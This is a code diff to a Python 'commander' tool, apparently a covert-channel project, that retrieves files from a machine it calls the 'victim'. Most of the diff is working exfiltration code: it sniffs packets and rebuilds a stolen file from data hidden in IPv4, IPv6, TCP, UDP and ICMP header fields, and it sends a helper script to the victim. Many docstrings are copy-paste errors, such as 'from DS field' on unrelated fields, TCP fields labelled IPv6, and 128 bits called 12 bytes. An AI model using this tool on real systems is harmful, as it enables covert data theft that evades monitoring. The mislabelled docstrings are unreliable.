@@ -8,7 +8,7 @@ import threading
 import time
 from scapy.layers.inet import IP, TCP, UDP, ICMP
 from scapy.layers.inet6 import IPv6
-from scapy.sendrecv import send
+from scapy.sendrecv import send, sniff
 import constants
 import ipaddress
 from ipv6_getter import determine_ipv6_address
@@ -342,10 +342,6 @@ def __print_header_choices(protocol_header_list: list, header: str):
         print("{} - {}".format(count, choice))
         count += 1
     print(constants.MENU_CLOSING_BANNER)
-
-
-def __text_to_bin(text):
-    return ''.join(format(ord(char), constants.BINARY_MODE) for char in text)
 
 
 def __bytes_to_bin(data):
@@ -2573,7 +2569,7 @@ def transfer_file_icmp_seq_num(client_sock: socket.socket,
         send(packet, verbose=0)
 
 
-def __get_protocol_header_function_map():
+def __get_protocol_header_transfer_function_map():
     return {  # A tuple of [Header, Field] => Function
         # a) IPv4 Handlers
         ("IPv4", "Version"): transfer_file_ipv4_version,
@@ -2631,7 +2627,7 @@ def __get_protocol_header_function_map():
 def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
                          source_ip: str, source_port: int, choices: tuple):
     # Initialize map
-    header_field_function_map = __get_protocol_header_function_map()
+    header_field_function_map = __get_protocol_header_transfer_function_map()
 
     # Get User Input for File + Check if Exists
     file_path = input(constants.TRANSFER_FILE_PROMPT.format(dest_ip, dest_port))
@@ -2710,8 +2706,978 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
         print(constants.MENU_CLOSING_BANNER)
         return None
 
+# ========================== EXTRACT COVERT DATA FUNCTIONS ==========================
 
-def receive_file(client_socket: socket.socket, client_ip: str, client_port: int):
+
+def __bin_to_bytes(binary_string):
+    return bytes(int(binary_string[i:i + 8], 2) for i in range(0, len(binary_string), 8))
+
+
+def covert_data_write_to_file(covert_data: str, filename: str):
+    """
+    Creates a file (if does not exist) and writes binary data to the file.
+
+    @param covert_data:
+        A string containing binary data
+
+    @param filename:
+        A string containing the file name
+
+    @return: None
+    """
+    if covert_data:
+        data = (__bin_to_bytes(covert_data)
+                .replace(constants.NULL_BYTE, b'')
+                .replace(constants.STX_BYTE, b''))
+
+        with open(filename, constants.WRITE_BINARY_MODE) as f:
+            f.write(data)
+
+
+def get_packet_count(client_socket: socket):
+    """
+    Returns the total number of packets from commander for
+    accurate Scapy sniff functionality.
+
+    @param client_socket:
+        The client socket
+
+    @return: count
+        An integer containing the total number of packets
+        to be received
+    """
+    count = int(client_socket.recv(1024).decode())
+    print(constants.CLIENT_RESPONSE.format(constants.CLIENT_TOTAL_PACKET_COUNT_MSG.format(count)))
+    return count
+
+# ===================== IPV4 EXTRACT COVERT DATA FUNCTIONS =====================
+
+
+def extract_data_ipv4_ttl(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified ttl field.
+
+    @note Bit length
+        The version field for IPv4 headers is 8 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from ttl field
+    """
+    if packet.haslayer('IP'):
+        covert_data = packet[IP].ttl
+        binary_data = format(covert_data, constants.EIGHT_BIT)  # Adjust to 8 bits for each character
+        return binary_data
+
+
+def extract_data_ipv4_version(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified version field.
+
+    @note Bit length
+        The version field for IPv4 headers is 4 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from version field
+    """
+    if packet.haslayer('IP'):
+        covert_data = packet[IP].version
+        binary_data = format(covert_data, constants.FOUR_BIT)  # Adjust to 4 bits for each character
+        return binary_data
+
+
+def extract_data_ipv4_ihl(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified IHL field.
+
+    @note Bit length
+        The IHL field for IPv4 headers is 4 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from IHL field
+    """
+    if packet.haslayer('IP'):
+        covert_data = packet[IP].ihl
+        binary_data = format(covert_data, constants.FOUR_BIT)  # Adjust to 4 bits for each character
+        return binary_data
+
+
+def extract_data_ipv4_ds(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified DS (differentiated services) field.
+
+    @note Bit length
+        The DS field for IPv4 headers is 6 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        covert_data = (packet[IP].tos >> 2) & 0b111111  # Get the first six bits of TOS (starting from most sig. bit)
+        binary_data = format(covert_data, constants.SIX_BIT)  # Adjust to 6 bits for each character
+        return binary_data
+
+
+def extract_data_ipv4_ecn(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified ECN field.
+
+    @note Bit length
+        The ECN field for IPv4 headers is 2 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        covert_data = (packet[IP].tos & 0b11)  # Get the last two bits of TOS (starting from least sig. bit)
+        binary_data = format(covert_data, constants.TWO_BIT)
+        return binary_data
+
+
+def extract_data_ipv4_total_length(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified total length field.
+
+    @note Bit length
+        The total length field for IPv4 headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        covert_data = packet[IP].len
+        binary_data = format(covert_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_ipv4_identification(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified identification field.
+
+    @note Bit length
+        The identification field for IPv4 headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        covert_data = packet[IP].id
+        binary_data = format(covert_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_ipv4_flags(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified flags field.
+
+    @note Bit length
+        The flags field for IPv4 headers is 3 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        covert_data = int(packet[IP].flags)
+        binary_data = format(covert_data, constants.THREE_BIT)
+        return binary_data
+
+
+def extract_data_ipv4_frag_offset(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified fragment offset field.
+
+    @note Bit length
+        The fragment offset field for IPv4 headers is 13 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        covert_data = packet[IP].frag
+        binary_data = format(covert_data, constants.THIRTEEN_BIT)
+        return binary_data
+
+
+def extract_data_ipv4_protocol(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified protocol field.
+
+    @note Bit length
+        The protocol field for IPv4 headers is 8 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        covert_data = packet[IP].proto
+        binary_data = format(covert_data, constants.EIGHT_BIT)
+        return binary_data
+
+
+def extract_data_ipv4_header_chksum(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified header checksum field.
+
+    @note Bit length
+        The header checksum field for IPv4 headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        covert_data = packet[IP].chksum
+        binary_data = format(covert_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_ipv4_src_addr(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified source address field.
+
+    @note Bit length
+        The source address field for IPv4 headers is 32 bits (4 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        # a) Initialize Variable
+        binary_data = ""
+
+        # b) Get covert data from the packet
+        covert_data = packet[IP].src
+
+        # c) Get each octet and place in variable
+        ip_octets = covert_data.split('.')  # IP Octet format: XXXX.XXXX.XXXX.XXXX
+        for octet in ip_octets:
+            binary_data += format(int(octet), constants.THIRTY_TWO_BIT)
+
+        return binary_data
+
+
+def extract_data_ipv4_dst_addr(packet):
+    """
+    A handler function to extract data from packets with IPv4
+    header and a modified source address field.
+
+    @attention Functionality Disabled
+        This is not used
+
+    @note Bit length
+        The source address field for IPv4 headers is 32 bits (4 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if packet.haslayer('IP'):
+        # a) Initialize Variable
+        binary_data = ""
+
+        # b) Get covert data from the packet
+        covert_data = packet[IP].dst
+
+        # c) Get each octet and place in variable
+        ip_octets = covert_data.split('.')  # IP Octet format: XXXX.XXXX.XXXX.XXXX
+        for octet in ip_octets:
+            binary_data += format(int(octet), constants.EIGHT_BIT)
+
+        return binary_data
+
+
+# ===================== IPV6 EXTRACT COVERT DATA FUNCTIONS =====================
+
+
+def __is_valid_ipv6(address: str):
+    try:
+        ipaddress.IPv6Address(address)
+        return True
+    except ipaddress.AddressValueError as e:
+        print(constants.INVALID_IPV6_ERROR.format(e))
+        return False
+
+
+def extract_data_ipv6_version(packet):
+    """
+    A handler function to extract data from packets with IPv6
+    header and a modified version field.
+
+    @note Bit length
+        The version field for IPv6 headers is 4 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IPv6 in packet:
+        version = packet[IPv6].version
+        binary_data = format(version, constants.FOUR_BIT)
+        return binary_data
+
+
+def extract_data_ipv6_traffic_class(packet):
+    """
+    A handler function to extract data from packets with IPv6
+    header and a modified traffic class field.
+
+    @note Bit length
+        The traffic class field for IPv6 headers is 8 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IPv6 in packet:
+        traffic_class_data = packet[IPv6].tc
+        binary_data = format(traffic_class_data, constants.EIGHT_BIT)
+        return binary_data
+
+
+def extract_data_ipv6_flow_label(packet):
+    """
+    A handler function to extract data from packets with IPv6
+    header and a modified flow label field.
+
+    @note Bit length
+        The flow label field for IPv6 headers is 20 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IPv6 in packet:
+        flow_label_data = packet[IPv6].fl
+        binary_data = format(flow_label_data, constants.TWENTY_BIT)
+        return binary_data
+
+
+def extract_data_ipv6_payload_length(packet):
+    """
+    A handler function to extract data from packets with IPv6
+    header and a modified payload length field.
+
+    @note Bit length
+        The payload length field for IPv6 headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IPv6 in packet:
+        payload_length_data = packet[IPv6].plen
+        binary_data = format(payload_length_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_ipv6_next_header(packet):
+    """
+    A handler function to extract data from packets with IPv6
+    header and a modified next header field.
+
+    @note Bit length
+        The next header field for IPv6 headers is 8 bits (1 byte)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IPv6 in packet:
+        next_header_data = packet[IPv6].nh
+        binary_data = format(next_header_data, constants.EIGHT_BIT)
+        return binary_data
+
+
+def extract_data_ipv6_hop_limit(packet):
+    """
+    A handler function to extract data from packets with IPv6
+    header and a modified hop limit field.
+
+    @note Bit length
+        The hop limit field for IPv6 headers is 8 bits (1 byte)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IPv6 in packet:
+        hop_limit_data = packet[IPv6].hlim
+        binary_data = format(hop_limit_data, constants.EIGHT_BIT)
+        return binary_data
+
+
+def extract_data_ipv6_src_addr(packet):
+    """
+    A handler function to extract data from packets with IPv6
+    header and a modified source address field.
+
+    @note Bit length
+        The source address field for IPv6 headers is 128 bits (12 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IPv6 in packet:
+        source_address = packet[IPv6].src
+        binary_data = ''.join(format(int(byte, 16), '08b') for byte in source_address.replace(':', ''))
+        return binary_data
+
+
+def extract_data_ipv6_dst_addr(packet):
+    """
+    A handler function to extract data from packets with IPv6
+    header and a modified destination address field.
+
+    @attention FUNCTIONALITY DISABLED
+        This is not used
+
+    @note Bit length
+        The source address field for IPv6 headers is 128 bits (12 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    return None
+
+
+# ===================== TCP EXTRACT COVERT DATA FUNCTIONS =====================
+
+
+def extract_data_tcp_src_port(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and a modified source port field.
+
+    @note Bit length
+        The source port field for IPv6 headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        src_port_data = packet[TCP].sport
+        binary_data = format(src_port_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_tcp_dst_port(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and a modified destination port field.
+
+    @note Bit length
+        The destination port field for IPv6 headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        dst_port_data = packet[TCP].dport
+        binary_data = format(dst_port_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_tcp_seq_num(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and a modified sequence number field.
+
+    @note Bit length
+        The sequence number field for IPv6 headers is 32 bits (4 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        seq_num_data = packet[TCP].seq
+        binary_data = format(seq_num_data, constants.THIRTY_TWO_BIT)
+        return binary_data
+
+
+def extract_data_tcp_ack_num(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and a modified acknowledgement number field.
+
+    @note Bit length
+        The acknowledgement number field for IPv6 headers is 32 bits (4 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        ack_num_data = packet[TCP].ack
+        binary_data = format(ack_num_data, constants.THIRTY_TWO_BIT)
+        return binary_data
+
+
+def extract_data_tcp_data_offset(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and a modified data offset field.
+
+    @note Bit length
+        The data offset field for IPv6 headers is 4 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        data_offset_data = packet[TCP].dataofs
+        binary_data = format(data_offset_data, constants.FOUR_BIT)
+        return binary_data
+
+
+def extract_data_tcp_reserved(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and a modified reserved field.
+
+    @note Bit length
+        The reserved field for IPv6 headers is 3 bits
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        reserved_data = packet[TCP].reserved
+        binary_data = format(reserved_data, constants.THREE_BIT)
+        return binary_data
+
+
+def extract_data_tcp_flags(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and several modified flag fields.
+
+    @note Bit length
+        The flags field for TCP headers is 9 bits for the different
+        flags (ECN, ACK, SYN, FIN, etc.)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        flag_data = int(packet[TCP].flags)
+        binary_data = format(flag_data, constants.NINE_BIT)
+        return binary_data
+
+
+def extract_data_tcp_window_size(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and window size field.
+
+    @note Bit length
+        The window field for TCP headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        window_data = packet[TCP].window
+        binary_data = format(window_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_tcp_chksum(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and checksum field.
+
+    @note Bit length
+        The checksum field for TCP headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        chksum_data = packet[TCP].chksum
+        binary_data = format(chksum_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_tcp_urgent_ptr(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and urgent pointer field.
+
+    @note Bit length
+        The urgent pointer field for TCP headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        urg_ptr_data = packet[TCP].urgptr
+        binary_data = format(urg_ptr_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_tcp_options(packet):
+    """
+    A handler function to extract data from packets with TCP
+    header and TimeStamp options field.
+
+    @note Bit length
+        The options field for TCP headers is maximum 320 bits (40 bytes)
+        16 bits chosen here for TimeStamp option
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and TCP in packet:
+        timestamp_option = packet[TCP].options[0][1][0]
+        binary_data = format(timestamp_option, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+# ===================== UDP EXTRACT COVERT DATA FUNCTIONS =====================
+
+
+def extract_data_udp_src_port(packet):
+    """
+    A handler function to extract data from packets with UDP
+    header and a modified source port field.
+
+    @note Bit length
+        The source port field for UDP headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and UDP in packet:
+        src_port_data = packet[UDP].sport
+        binary_data = format(src_port_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_udp_dst_port(packet):
+    """
+    A handler function to extract data from packets with UDP
+    header and a modified destination port field.
+
+    @note Bit length
+        The destination port field for UDP headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and UDP in packet:
+        dst_port_data = packet[UDP].dport
+        binary_data = format(dst_port_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_udp_length(packet):
+    """
+    A handler function to extract data from packets with UDP
+    header and a modified length field.
+
+    @note Bit length
+        The length field for UDP headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and UDP in packet:
+        length_data = packet[UDP].len
+        binary_data = format(length_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_udp_chksum(packet):
+    """
+    A handler function to extract data from packets with UDP
+    header and a modified checksum field.
+
+    @note Bit length
+        The checksum field for UDP headers is 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and UDP in packet:
+        chksum_data = packet[UDP].chksum
+        binary_data = format(chksum_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+# ===================== ICMP EXTRACT COVERT DATA FUNCTIONS =====================
+
+
+def extract_data_icmp_type(packet):
+    """
+    A handler function to extract data from packets with ICMP
+    header and a modified type field.
+
+    @note Bit length
+        The type field for ICMP headers is maximum 8 bits (1 byte)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and ICMP in packet:
+        type_data = packet[ICMP].type
+        binary_data = format(type_data, constants.EIGHT_BIT)
+        return binary_data
+
+
+def extract_data_icmp_code(packet):
+    """
+    A handler function to extract data from packets with ICMP
+    header and a modified code field.
+
+    @note Bit length
+        The code field for ICMP headers is maximum 8 bits (1 byte)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and ICMP in packet:
+        code_data = packet[ICMP].code
+        binary_data = format(code_data, constants.EIGHT_BIT)
+        return binary_data
+
+
+def extract_data_icmp_chksum(packet):
+    """
+    A handler function to extract data from packets with ICMP
+    header and a modified checksum field.
+
+    @note Bit length
+        The checksum field for ICMP headers is maximum 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and ICMP in packet:
+        chksum_data = packet[ICMP].chksum
+        binary_data = format(chksum_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_icmp_identification(packet):
+    """
+    A handler function to extract data from packets with ICMP
+    header and a modified identification field.
+
+    @note Bit length
+        The identification field for ICMP headers is maximum 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and ICMP in packet:
+        id_data = packet[ICMP].id
+        binary_data = format(id_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def extract_data_icmp_seq_num(packet):
+    """
+    A handler function to extract data from packets with ICMP
+    header and a modified sequence number field.
+
+    @note Bit length
+        The sequence number field for ICMP headers is maximum 16 bits (2 bytes)
+
+    @param packet:
+        The received packet
+
+    @return binary_data:
+        A string containing binary data from DS field
+    """
+    if IP in packet and ICMP in packet:
+        seq_num_data = packet[ICMP].seq
+        binary_data = format(seq_num_data, constants.SIXTEEN_BIT)
+        return binary_data
+
+
+def get_protocol_header_function_extract_map():
+    return {  # A tuple of [Header, Field] => Function
+        # a) IPv4 Handlers
+        ("IPv4", "Version"): extract_data_ipv4_version,
+        ("IPv4", "IHL (Internet Header Length)"): extract_data_ipv4_ihl,
+        ("IPv4", "DS (Differentiated Services Codepoint)"): extract_data_ipv4_ds,
+        ("IPv4", "Explicit Congestion Notification (ECN)"): extract_data_ipv4_ecn,
+        ("IPv4", "Total Length"): extract_data_ipv4_total_length,
+        ("IPv4", "Identification"): extract_data_ipv4_identification,
+        ("IPv4", "Flags"): extract_data_ipv4_flags,
+        ("IPv4", "Fragment Offset"): extract_data_ipv4_frag_offset,
+        ("IPv4", "TTL (Time to Live)"): extract_data_ipv4_ttl,
+        ("IPv4", "Protocol"): extract_data_ipv4_protocol,
+        ("IPv4", "Header Checksum"): extract_data_ipv4_header_chksum,
+        ("IPv4", "Source Address"): extract_data_ipv4_src_addr,
+        ("IPv4", "Destination Address"): extract_data_ipv4_dst_addr,
+
+        # b) IPv6 Handlers
+        ("IPv6", "Version"): extract_data_ipv6_version,
+        ("IPv6", "Traffic Class"): extract_data_ipv6_traffic_class,
+        ("IPv6", "Flow Label"): extract_data_ipv6_flow_label,
+        ("IPv6", "Payload Length"): extract_data_ipv6_payload_length,
+        ("IPv6", "Next Header"): extract_data_ipv6_next_header,
+        ("IPv6", "Hop Limit"): extract_data_ipv6_hop_limit,
+        ("IPv6", "Source Address"): extract_data_ipv6_src_addr,
+        ("IPv6", "Destination Address"): extract_data_ipv6_dst_addr,
+
+        # c) TCP Handlers
+        ("TCP", "Source Port"): extract_data_tcp_src_port,
+        ("TCP", "Destination Port"): extract_data_tcp_dst_port,
+        ("TCP", "Sequence Number"): extract_data_tcp_seq_num,
+        ("TCP", "Acknowledgement Number"): extract_data_tcp_ack_num,
+        ("TCP", "Data Offset"): extract_data_tcp_data_offset,
+        ("TCP", "Reserved"): extract_data_tcp_reserved,
+        ("TCP", "Flags"): extract_data_tcp_flags,
+        ("TCP", "Window Size"): extract_data_tcp_window_size,
+        ("TCP", "Checksum"): extract_data_tcp_chksum,
+        ("TCP", "Urgent Pointer"): extract_data_tcp_urgent_ptr,
+        ("TCP", "Options"): extract_data_tcp_options,
+
+        # d) UDP Handlers
+        ("UDP", "Source Port"): extract_data_udp_src_port,
+        ("UDP", "Destination Port"): extract_data_udp_dst_port,
+        ("UDP", "Length"): extract_data_udp_length,
+        ("UDP", "Checksum"): extract_data_udp_chksum,
+
+        # e) ICMP Handlers
+        ("ICMP", "Type (Type of Message)"): extract_data_icmp_type,
+        ("ICMP", "Code"): extract_data_icmp_code,
+        ("ICMP", "Checksum"): extract_data_icmp_chksum,
+        ("ICMP", "Identifier"): extract_data_icmp_identification,
+        ("ICMP", "Sequence Number"): extract_data_icmp_seq_num,
+    }
+
+
+def receive_file_covert(client_socket: socket.socket,
+                        client_ip: str,
+                        client_port: int,
+                        source_ip: str,
+                        source_port: int,
+                        choices: tuple):
     # Create Downloads and Client IP directories
     sub_directory_path = __make_main_and_sub_directories(client_ip)
 
@@ -2723,29 +3689,123 @@ def receive_file(client_socket: socket.socket, client_ip: str, client_port: int)
     res = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
 
     if res == constants.RECEIVED_CONFIRMATION_MSG:
-        # Get user prompt + send to client
+        # Get user prompt (file path + covert channel config)
+        received_packets = []
         file_path = input(constants.GET_FILE_PROMPT.format(client_ip, client_port))
         file_name = file_path.split("/")[-1]
         save_file_path = sub_directory_path + "/" + file_name
-        client_socket.send(file_path.encode())
+
+        # Send Data to Client (choice[0, 1] = header, field)
+        client_socket.send((file_path + "/" + choices[0] + "/" + choices[1] + "/" + str(source_port)).encode())
+
+        # CHECK: If destination field choice, do nothing
+        if constants.DESTINATION_ADDRESS_FIELD in choices:
+            __transfer_file_dst_addr_error_handler(choices[1], choices[0])
+            return None
 
         # Wait for response
         res = client_socket.recv(constants.BYTE_LIMIT).decode()
 
-        # Receive File if exists (MUST DO: put in downloads/[client_ip])
+        # Receive File if exists
         if res == constants.GET_FILE_EXIST:
-            with open(save_file_path, constants.WRITE_BINARY_MODE) as file:
-                eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
+            # Get function handler from a map (according to header/field)
+            header_field_function_map = get_protocol_header_function_extract_map()
+            if choices in header_field_function_map:
+                selected_function = header_field_function_map.get(choices)
 
-                while True:
-                    file_data = client_socket.recv(1024)
-                    if not file_data:
-                        break  # No more data received
-                    if file_data.endswith(eof_marker):
-                        file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
-                        break
-                    else:
-                        file.write(file_data)
+            # A callback function for handling of received packets
+            def packet_callback(packet):
+                global filename
+                binary_data = selected_function(packet)
+                return binary_data
+
+            # DIFFERENT SNIFFS: For IPv4 Headers/Field
+            if constants.IPV4 in choices:
+                # Get total count of packets
+                count = get_packet_count(client_socket)
+
+                if constants.SOURCE_ADDRESS_FIELD in choices:
+                    received_packets = sniff(filter="dst host {} and dst port {}"
+                                             .format(source_ip, source_port), count=count)
+                else:  # REGULAR IPv4 SNIFF
+                    received_packets = sniff(filter="src host {}".format(client_ip), count=count)
+
+            # DIFFERENT SNIFFS: For IPv6 Headers/Field
+            if constants.IPV6 in choices:
+                # Get own IPv6 address and port
+                source_ipv6_ip, source_ipv6_port = determine_ipv6_address()
+
+                # Transfer ipv6_getter.py file to victim/target and get their IPv6 address
+                victim_ipv6_addr, _ = __get_target_ipv6_address(client_socket, client_ip, client_port)
+
+                # Send own IPv6 address and port
+                client_socket.send((source_ipv6_ip + "/" + source_ipv6_port).encode())
+
+                # Get total count of packets
+                count = get_packet_count(client_socket)
+
+                if constants.NEXT_HEADER in choices:
+                    received_packets = sniff(filter="src host {} and dst host {}"
+                                             .format(victim_ipv6_addr, source_ipv6_ip),
+                                             count=count)
+                else:
+                    received_packets = sniff(filter="dst host {} and dst port {}"
+                                             .format(source_ipv6_ip, source_ipv6_port),
+                                             count=count)
+
+            # DIFFERENT SNIFFS: For TCP Headers/Field
+            if constants.TCP in choices:
+                count = get_packet_count(client_socket)
+
+                if constants.SOURCE_PORT_FIELD in choices:
+                    received_packets = sniff(filter="tcp and dst host {} and dst port {} and "
+                                                    "(tcp[13] & 0x004 == 0)"  # tcp[13] offset RST flag (0x004)
+                                             .format(source_ip, source_port),
+                                             count=count)
+
+                elif constants.DESTINATION_PORT_FIELD in choices:
+                    received_packets = sniff(filter="tcp and dst host {} and src host {} and "
+                                                    "(tcp[13] & 0x004 == 0)"
+                                             .format(source_ip, client_ip),
+                                             count=count)
+
+                elif constants.FLAG in choices:  # Capture all flags
+                    received_packets = sniff(filter="tcp and dst host {} and dst port {}"
+                                             .format(source_ip, source_port),
+                                             count=count)
+                else:
+                    received_packets = sniff(filter="tcp and dst host {} and dst port {} "
+                                                    "and tcp[13] & 0x004 == 0"
+                                             .format(source_ip, source_port),
+                                             count=count)
+
+            # DIFFERENT SNIFFS: For UDP Headers/Field
+            if constants.UDP in choices:
+                count = get_packet_count(client_socket)
+
+                if constants.DESTINATION_PORT_FIELD in choices:
+                    received_packets = sniff(filter="udp and dst host {} and src host {}"
+                                             .format(source_ip, client_ip),
+                                             count=count)
+                else:
+                    received_packets = sniff(filter="udp and dst host {} and dst port {}"
+                                             .format(source_ip, source_port),
+                                             count=count)
+
+            # DIFFERENT SNIFFS: For ICMP Header/Fields
+            if constants.ICMP in choices:
+                count = get_packet_count(client_socket)
+
+                received_packets = sniff(filter="icmp and dst host {} and src host {}"
+                                         .format(source_ip, client_ip),
+                                         count=count)
+
+            # Extract Data
+            extracted_data = ''.join(packet_callback(packet)
+                                     for packet in received_packets if packet_callback(packet))
+
+            # Write Data to File
+            covert_data_write_to_file(extracted_data, file_name)
 
             # Send ACK to victim (if good)
             if is_file_openable(save_file_path):
@@ -3547,7 +4607,3 @@ def perform_menu_item_11(client_list: dict,
     # Print closing statements
     print(constants.RETURN_MAIN_MENU_MSG)
     print(constants.MENU_CLOSING_BANNER)
-
-
-if __name__ == '__main__':
-    protocol_and_field_selector()
